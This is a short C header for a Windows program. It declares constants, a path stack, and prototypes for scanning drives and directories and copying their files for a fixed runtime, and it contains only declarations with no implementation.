#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <wchar.h>
#include <Windows.h>

#define SLEEP_TIMEOUT_MS 1000         // drives searching pause in millisenonds
#define VOLUME_NAME_SIZE MAX_PATH + 1 // DONT CHANGE THIS
#define DRIVE_ROOT_PATH_SIZE 4        // DONT CHANGE THIS
#define FILE_BUFFER_SIZE 262144       // 0 bytes < FILE_BUFFER_SIZE < 1048575 bytes
#define RUNTIME_SEC 30                // how long program works in seconds

typedef struct STACK_NODE
{
    WCHAR path[MAX_PATH];
    WCHAR outputPath[MAX_PATH];
    struct STACK_NODE *next;
} Node;

void BuildPath(WCHAR *destination, const WCHAR *directory, const WCHAR *filename);
size_t ScanDirFiles(LPCWSTR path, LPCWSTR outputPath);
size_t ScanDriveFiles(LPCWSTR path, WCHAR *driveName);
size_t CopyDirFiles(WCHAR *pathIn, WCHAR *pathOut, unsigned char *buffer);
void stpush(Node **stack, LPCWSTR path, LPCWSTR outputPath);
void stpop(Node **stack, WCHAR *path, WCHAR *outputPath);